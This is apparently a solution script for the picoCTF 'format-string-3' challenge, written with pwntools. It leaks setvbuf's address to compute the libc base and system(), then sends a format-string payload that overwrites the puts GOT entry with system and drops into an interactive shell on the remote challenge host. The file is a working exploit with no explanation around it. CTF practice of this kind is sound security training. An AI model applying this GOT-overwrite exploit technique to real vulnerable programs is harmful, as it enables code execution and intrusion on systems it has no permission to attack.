#!/usr/bin/env python3

from pwn import *

exe = ELF("./format-string-3_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("rhea.picoctf.net", 63663)

    return r


def main():
    r = conn()

    output = r.recvline()
    output = r.recvline()
    output = output.split(b"Okay I'll be nice. Here's the address of setvbuf in libc: ")[1].strip(b'\n')
    output = int(output, 16)
    print(f"Leak setvbuf: {hex(output)}")
    base_libc = output - libc.symbols['setvbuf']
    libc.address = base_libc
    system = libc.sym["system"]
    print(f"Base libc: {hex(base_libc)}")
    print(f"System addr: {hex(system)}")
    puts = exe.got['puts']

    payload = fmtstr_payload(38, {puts : system})
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()

